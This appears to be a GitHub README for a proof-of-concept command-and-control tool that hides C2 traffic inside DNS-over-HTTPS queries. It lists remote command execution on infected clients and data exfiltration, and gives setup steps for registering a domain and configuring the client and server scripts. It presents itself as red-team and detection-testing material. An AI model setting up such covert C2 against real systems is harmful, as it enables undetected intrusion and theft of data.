# Dns-over-HTTPS-DOH
This project provides a proof-of-concept implementation of a Command and Control (C2) infrastructure using DNS over HTTPS (DoH). 
DoH C2 allows for covert communication between the C2 server and the infected client machines by leveraging encrypted DNS queries
thereby making the traffic appear legitimate and harder to detect by traditional network monitoring tools.

# Testing and Limitations
This project is intended for educational purposes and authorized security research only. 
Bypassing antivirus software or other security measures is not within the scope of this project. 
It is designed for testing in controlled environments to demonstrate the feasibility and mechanics of using DoH for C2 communication **to test enterprise corporate forward proxy detection and improve any custom build signatures in SIEMs.**

# Features
**Covert Communication**: Utilizes DoH to encode and disguise C2 traffic.

**Command Execution**: Supports remote execution of commands on infected Linux clients.

**Data Exfiltration**: Allows for exfiltration of data through DOH queries.

**Server and Client Implementation**: Includes both C2 server and client components.

# Initial setup
For client side, linux is recommended but the code was tested on Windows 10 and seem to worked :)  
For server side linux.  

1. **Client Side**  
    Install Python >=3.8 from the official website or your package manager.  
     Install the requests library using pip:  
     pip install requests
2. **Server side** only Linux  
    Install the dnslib library using pip
    pip install dnslib  

3. Register domain 
Example purchasing domain using namecheap.com
![grafik](https://github.com/user-attachments/assets/26f16ed6-1a45-4b1c-8ddc-cac2287eba24)

Follow instructions on the screenshot bellow to setup the NameServer.
Replace the IP and domainname with your purchased domain and server Public IP
![grafik](https://github.com/user-attachments/assets/c9e9f4cf-ac77-4b31-b92d-7bfe28ed93e9)

# Usage
**1. Client side**  

Make sure to change the bellow in the "doh_client.py" to the domain registered in step 3.  

if __name__ == "__main__":
    domain_name = "send.examples.com.co"  # Replace after '**send**' with your domain
    execute_command_from_dns(domain_name)

      
python3 doh_client.py  
Example run 
![grafik](https://github.com/user-attachments/assets/ff8f6724-9985-4411-87f0-7435cad4ad7f)


**2. Server side**  

Make sure to change the IP in the "doh_server.py"  

class DNSDoHServer:
    def __init__(self, host='YOURIP', port=53): # Replace with Your public IP


Example run:
![grafik](https://github.com/user-attachments/assets/aa582469-afdb-4018-adc6-74f4a23248d6)


Note instead of the  examples.com.co you should use your domain name
Run: python3 doh_server.py

# Architecture TODO
# Detection Tips TODO
